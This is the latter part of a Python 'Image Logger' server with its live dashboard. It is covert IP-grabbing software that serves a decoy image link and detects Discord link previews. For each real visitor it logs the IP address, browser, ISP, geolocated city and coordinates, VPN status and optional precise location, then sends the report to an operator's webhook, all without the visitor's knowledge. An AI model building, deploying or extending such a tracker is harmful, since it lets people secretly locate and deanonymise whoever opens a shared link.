            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache, no-transform")
            self.send_header("Connection", "close")
            self.send_header("X-Accel-Buffering", "no")
            self.end_headers()
        except (BrokenPipeError, ConnectionResetError):
            return

        self.close_connection = True

        def push(data: bytes) -> None:
            self.wfile.write(data)
            self.wfile.flush()

        q = subscribe()
        try:
            # first frame: makes proxies/CDNs flush the headers immediately
            push(b"retry: 3000\n: connected\n\n")

            snapshot = history()[-100:]
            if snapshot:
                payload = json.dumps({"type": "history", "events": snapshot},
                                     ensure_ascii=False)
                push(f"data: {payload}\n\n".encode("utf-8"))

            last_beat = time.time()
            while True:
                try:
                    event = q.get(timeout=10)
                except queue.Empty:
                    event = None
                if event is None:
                    if time.time() - last_beat < 15:
                        continue
                    push(b": ping\n\n")
                    last_beat = time.time()
                    continue
                chunk = (b"data: "
                         + json.dumps(event, ensure_ascii=False).encode("utf-8")
                         + b"\n\n")
                push(chunk)
                last_beat = time.time()
        except (BrokenPipeError, ConnectionResetError, OSError):
            pass
        finally:
            unsubscribe(q)

    # --------------------------- the logger --------------------------- #
    def _log_hit(self, path: str) -> None:
        query = self._query()
        user_agent = self.headers.get("User-Agent") or ""
        ip = client_ip(self.headers, self.client_address)
        endpoint = path or "/"

        if any(ip.startswith(str(b)) for b in config.get("blacklistedIPs", [])):
            return self._send(404, "text/plain; charset=utf-8", b"Not Found")

        image_url = decode_image_arg(query) if config["imageArgument"] else config["image"]

        crawler = is_discord_ip(ip) or any(h in user_agent for h in CRAWLER_HINTS)

        # 1) crawler -> serve a preview image and raise a link alert
        if crawler:
            mode = config.get("preview") or (
                "loading" if config["buggedImage"] else "redirect")
            if mode == "loading":
                self._send(200, "image/jpeg", BINARIES["loading"])
            elif mode == "redirect":
                self._send(302, "text/plain", b"", extra={"Location": image_url})
            else:
                preview = fetch_image(image_url)
                if preview:
                    self._send(200, preview[1], preview[0])
                else:  # couldn't fetch it server-side -> let the client follow
                    self._send(302, "text/plain", b"", extra={"Location": image_url})
            say("alert", f"link preview requested by {user_agent or ip}")
            if config["linkAlerts"]:
                emit("alert", {"ip": ip, "ua": user_agent or "Unknown",
                               "endpoint": endpoint, "kind": "crawler"})
                queue_webhook({
                    "username": config["username"],
                    "content": "",
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": int(config.get("color") or 0x00FFFF),
                        "description": (f"An **Image Logging** link was sent in a chat!\n"
                                        f"You may receive a visitor soon.\n\n"
                                        f"**Endpoint:** `{endpoint}`\n**IP:** `{ip}`"),
                    }],
                })
            return

        # 2) real human -> log it
        event_id = uuid.uuid4().hex[:12]
        location = None
        if query.get("g") and config["accurateLocation"]:
            try:
                location = base64.b64decode(query["g"].encode()).decode()
            except Exception:
                location = None

        emit("open", {"id": event_id, "ip": ip, "ua": user_agent or "Unknown",
                      "endpoint": endpoint, "ts": time.time()})
        say("net", f"open from {ip} → {endpoint}")

        threading.Thread(
            target=send_report,
            args=(ip, user_agent, endpoint, image_url, location, event_id),
            daemon=True,
        ).start()

        message = config["message"]["message"]
        if config["message"]["doMessage"] and config["message"]["richMessage"]:
            message = rich_message(message, geo_for(ip, timeout=1.5), ip, user_agent)

        body = build_page(image_url, message, config["accurateLocation"] and not location)
        self._send(200, "text/html; charset=utf-8", body)


# --------------------------------------------------------------------------- #
# Dashboard
# --------------------------------------------------------------------------- #

DASHBOARD_HTML = r"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Image Logger — Live</title>
<style>
:root{--bg:#0a0b0f;--card:#12141b;--line:#1e2230;--txt:#e7e9ee;--dim:#8b91a5;--acc:#00e5ff;}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--txt);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
header{position:sticky;top:0;z-index:5;display:flex;gap:16px;align-items:center;flex-wrap:wrap;
 padding:14px 20px;background:rgba(10,11,15,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
h1{margin:0;font-size:15px;letter-spacing:.14em;text-transform:uppercase;color:var(--acc)}
.dot{width:8px;height:8px;border-radius:50%;background:#ff4d4d;display:inline-block;margin-right:6px}
.dot.on{background:#22e06a;box-shadow:0 0 10px #22e06a}
.stats{display:flex;gap:18px;margin-left:auto;flex-wrap:wrap}
.stat b{display:block;font-size:18px;color:var(--acc)}
.stat span{font-size:10px;color:var(--dim);letter-spacing:.1em;text-transform:uppercase}
main{padding:18px 20px 60px;max-width:1100px;margin:0 auto}
.card{background:var(--card);border:1px solid var(--line);border-left:3px solid var(--acc);
 border-radius:10px;padding:14px 16px;margin-bottom:10px;animation:in .35s ease}
@keyframes in{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:none}}
.card.alert{border-left-color:#ffcc00}
.row{display:flex;gap:12px;flex-wrap:wrap;align-items:baseline}
.ip{font-size:17px;font-weight:700;color:#fff}
.place{color:#22e06a}
.tag{background:#191c26;border:1px solid var(--line);border-radius:20px;padding:1px 9px;font-size:11px;color:var(--dim)}
.kv{margin-top:8px;display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:4px 14px;font-size:12px}
.kv i{color:var(--dim);font-style:normal}
.ua{margin-top:8px;font-size:11px;color:var(--dim);word-break:break-all;border-top:1px dashed var(--line);padding-top:7px}
time{margin-left:auto;font-size:11px;color:var(--dim)}
.empty{color:var(--dim);text-align:center;padding:60px 10px;border:1px dashed var(--line);border-radius:12px}
code{background:#191c26;padding:1px 5px;border-radius:4px;color:#ffd166}
</style></head>
<body>
<header>
  <span class="dot" id="dot"></span>
  <h1>Image Logger · Live</h1>
  <div class="stats">
    <div class="stat"><b id="s-hits">0</b><span>Hits</span></div>
    <div class="stat"><b id="s-unique">0</b><span>Unique IPs</span></div>
    <div class="stat"><b id="s-countries">0</b><span>Countries</span></div>
  </div>
</header>
<main>
  <div id="list"><div class="empty">Waiting for visitors…</div></div>
</main>
<script>
const list = document.getElementById('list');
const dot  = document.getElementById('dot');
const TOKEN = new URLSearchParams(location.search).get('token') || '';
const QS = TOKEN ? ('?token='+encodeURIComponent(TOKEN)) : '';
let  seen  = new Set();
let  seenKeys = new Set();

function esc(s){const d=document.createElement('div');d.textContent=s==null?'':String(s);return d.innerHTML;}
function timeAgo(ts){
  const s=Math.max(0,Math.floor((Date.now()-ts)/1000));
  if(s<60)return s+'s ago'; if(s<3600)return Math.floor(s/60)+'m ago';
  return Math.floor(s/3600)+'h ago';
}
function bump(el,v){document.getElementById(el).textContent=v;}

function card(ev){
  const d=ev.data||{}, g=d.geo||{};
  const isAlert=ev.type==='alert';
  const geoText=[g.city,g.regionName,g.country].filter(Boolean).join(', ');
  const statusTag = geoText ? '' :
      (d.geoStatus==='local' ? '<span class="tag">private IP</span>'
       : d.geoStatus==='unavailable' ? '<span class="tag">location unavailable</span>' : '');
  const el=document.createElement('div');
  el.className='card'+(isAlert?' alert':'');
  el.dataset.id=ev.id;
  if(isAlert){
    el.innerHTML=`<div class="row"><span class="ip">Link shared in chat</span>
      <span class="tag">discord crawler · preview fetch (not a viewer)</span>
      <time>${timeAgo(ev.ts*1000)}</time></div>
      <div class="kv"><div><i>IP</i> ${esc(d.ip)}</div><div><i>Endpoint</i> ${esc(d.endpoint)}</div>
      <div><i>Note</i> this is Discord's server, no target location here</div></div>
      <div class="ua">${esc(d.ua)}</div>`;
    return el;
  }
  el.innerHTML=`
    <div class="row">
      <span class="ip">${esc(d.ip||'unknown')}</span>
      ${geoText?`<span class="place">${esc(geoText)}</span>`:''}
      ${d.browser?`<span class="tag">${esc(d.os||'?')} · ${esc(d.browser)}</span>`:''}
      ${statusTag}
      ${g.proxy?'<span class="tag">VPN/PROXY</span>':''}
      ${g.hosting?'<span class="tag">HOSTING/BOT</span>':''}
      ${d.location?`<span class="tag">GPS ${esc(d.location)}</span>`:''}
      <time>${timeAgo(ev.ts*1000)}</time>
    </div>
    <div class="kv">
      <div><i>ISP</i> ${esc(g.isp||'…')}</div>
      <div><i>ASN</i> ${esc(g.as||'…')}</div>
      <div><i>City</i> ${esc(g.city||'…')}</div>
      <div><i>Region</i> ${esc(g.regionName||'…')}</div>
      <div><i>Country</i> ${esc(g.country||'…')}</div>
      <div><i>Coords</i> ${g.lat!=null?esc(g.lat+', '+g.lon):'…'}</div>
      <div><i>Timezone</i> ${esc(g.timezone||'…')}</div>
      <div><i>Endpoint</i> ${esc(d.endpoint||'')}</div>
      <div><i>Mobile</i> ${esc(String(g.mobile??'…'))}</div>
      <div><i>VPN</i> ${esc(String(g.proxy??'…'))}</div>
    </div>
    <div class="ua">${esc(d.ua||'')}</div>`;
  return el;
}

function safeParse(s){try{return JSON.parse(s||'{}')}catch(e){return{}}}

function refreshStats(d,type){
  if(!d)return;
  if(d.hits!=null){bump('s-hits',d.hits);bump('s-unique',d.unique);bump('s-countries',d.countries);}
  else if(d.ip&&type==='open'){seen.add(d.ip);bump('s-unique',Math.max(seen.size,0));}
}

function upsert(ev){
  if(!ev)return;
  if(ev.type==='history'){(ev.events||[]).forEach(upsert);return;}
  if(!ev.data)return;
  const key=ev.id+':'+ev.type;
  if(seenKeys.size>2000)seenKeys.clear();

  // geo enrichment arrives after the card was created -> patch it in place
  if(ev.type==='geo'){
    const id=ev.data.id||ev.id;
    const node=list.querySelector('[data-id="'+id+'"]');
    if(node&&ev.data.geo&&!seenKeys.has(key)){
      const raw=safeParse(node.dataset.raw); raw.geo=ev.data.geo;
      const fresh=card({id:id,type:'log',ts:+node.dataset.ts||ev.ts,data:raw});
      fresh.dataset.raw=JSON.stringify(raw); fresh.dataset.ts=node.dataset.ts;
      node.replaceWith(fresh);
      seenKeys.add(key);
    }
    return;
  }

  if(seenKeys.has(key))return;      // already rendered (polling/SSE overlap)
  seenKeys.add(key);

  const existing=list.querySelector('[data-id="'+ev.id+'"]');
  const node=card(ev);
  node.dataset.raw=JSON.stringify(ev.data);
  node.dataset.ts=String(ev.ts);

  if(existing){                     // richer payload replaces the bare card
    existing.replaceWith(node);
    refreshStats(ev.data,ev.type);
    return;
  }
  const empty=list.querySelector('.empty'); if(empty)empty.remove();
  list.prepend(node);
  while(list.children.length>120)list.removeChild(list.lastChild);
  refreshStats(ev.data,ev.type);
}

let sseLive=false, pollTimer=null;
function loadHistory(){
  return fetch('/api/logs'+QS).then(r=>r.json()).then(d=>{
    bump('s-hits',d.stats.hits); bump('s-unique',d.stats.unique); bump('s-countries',d.stats.countries);
    (d.events||[]).forEach(upsert);
  }).catch(()=>{});
}
function connect(){
  const es=new EventSource('/events'+QS);
  es.onopen=()=>{dot.classList.add('on');};
  es.onerror=()=>{dot.classList.remove('on');};
  es.onmessage=e=>{sseLive=true; try{upsert(JSON.parse(e.data));}catch(err){} };
}
connect();
loadHistory();
// Some CDNs buffer Server-Sent Events. If nothing arrives within a few seconds,
// poll instead so the feed stays realtime (upserts are idempotent).
setTimeout(()=>{
  if(sseLive)return;
  pollTimer=setInterval(loadHistory,2000);
  loadHistory();
  dot.classList.add('on');
  const h=document.querySelector('h1'); if(h)h.textContent='Image Logger · Live (polling)';
},4000);
setInterval(()=>{
  document.querySelectorAll('.card').forEach(c=>{
    const ts=c.dataset.ts, el=c.querySelector('time');
    if(ts&&el)el.textContent=timeAgo(+ts*1000);
  });
},10000);
</script>
</body></html>"""


# --------------------------------------------------------------------------- #
# Server bootstrap
# --------------------------------------------------------------------------- #

STARTED = time.time()
PUBLIC_BASE = None
_server: ThreadingHTTPServer | None = None


def start_server(host: str | None = None, port: int | None = None) -> ThreadingHTTPServer:
    global _server
    host = host or config.get("host") or "127.0.0.1"
    port = int(port if port is not None else config.get("port") or 8080)

    for _ in range(5):
        try:
            _server = ThreadingHTTPServer((host, port), Handler)
            break
        except OSError:
            port += 1
    else:
        raise SystemExit("could not bind a port — is another instance running?")

    config["host"], config["port"] = host, _server.server_address[1]

    threading.Thread(target=_geo_worker, daemon=True).start()
    for _ in range(WEBHOOK_WORKERS):
        threading.Thread(target=_webhook_worker, daemon=True).start()

    # enforce the retention window before anything is replayed, then keep
    # sweeping hourly (dataRetentionDays = 0 disables pruning)
    try:
        prune_archive()
    except Exception:
        say("error", "retention sweep failed:\n" + traceback.format_exc(limit=4))
    if int(config.get("dataRetentionDays") or 0) > 0:
        threading.Thread(target=_retention_worker, daemon=True).start()

    # replay yesterday's (well, last session's) hits into the dashboard
    if os.path.isfile(_log_path):
        try:
            with open(_log_path, "r", encoding="utf-8") as fh:
                lines = fh.readlines()[-300:]
            restored = []
            for line in lines:
                try:
                    event = json.loads(line)
                except ValueError:
                    continue
                if event.get("type") in ("open", "log", "alert"):
                    restored.append(event)
                if event.get("type") == "log":
                    data = event.get("data") or {}
                    _stats["hits"] = max(_stats["hits"], int(data.get("hits") or 0))
                    if data.get("ip"):
                        _stats["unique"].add(data["ip"])
                    country = (data.get("geo") or {}).get("country")
                    if country:
                        _stats["countries"].add(country)
            _history.extend(restored)
            if restored:
                say("net", f"restored {len(restored)} previous event(s) from {_log_path}")
        except OSError:
            pass

    # warm the preview cache so the embed image is ready before anyone shares
    if (config.get("preview") or "image") == "image" and config.get("image", "").startswith("http"):
        threading.Thread(target=fetch_image, args=(config["image"],), daemon=True).start()

    say("net", f"{__app__} {__version__} listening on http://{host}:{_server.server_address[1]}")
    if not config.get("webhook"):
        say("warn", "no webhook configured — hits are logged to the dashboard/file only")
    say("net", f"dashboard: http://{host}:{_server.server_address[1]}"
               f"{(config.get('dashboard') or {}).get('path', '/dashboard')}")
    return _server


def main() -> None:
    server = start_server()
    say("net", "press Ctrl+C to stop")
    try:
        server.serve_forever(poll_interval=0.5)
    except KeyboardInterrupt:
        say("net", "shutting down")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
